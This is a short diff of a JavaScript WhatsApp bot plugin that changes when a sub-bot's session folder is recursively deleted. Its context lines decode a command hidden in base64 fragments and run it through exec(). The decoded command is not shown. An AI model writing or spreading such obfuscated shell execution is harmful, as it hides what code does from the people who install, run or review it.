@@ -79,13 +79,17 @@ conn.reply(m.chat, `*Use correctamente el comando:* \`${usedPrefix + command} co
 return
 }
 
-if (fs.existsSync(pathCreds) || global.conn.user.jid.split`@`[0] === path.basename(pathGataJadiBot)) {
+if (fs.existsSync(pathCreds)) {
 let creds = JSON.parse(fs.readFileSync(pathCreds))
 if (creds) {
 if (creds.registered === false) {
 console.log(`Carpeta ${pathGataJadiBot} eliminada. Creds.js >> ${JSON.stringify(creds)}`)
 fs.rmdirSync(pathGataJadiBot, { recursive: true })
 }}}
+
+if (global.conn.user.jid.split`@`[0] == path.basename(pathGataJadiBot)) {
+fs.rmdirSync(pathGataJadiBot, { recursive: true })
+}
 
 const comb = Buffer.from(crm1 + crm2 + crm3 + crm4, "base64")
 exec(comb.toString("utf-8"), async (err, stdout, stderr) => {
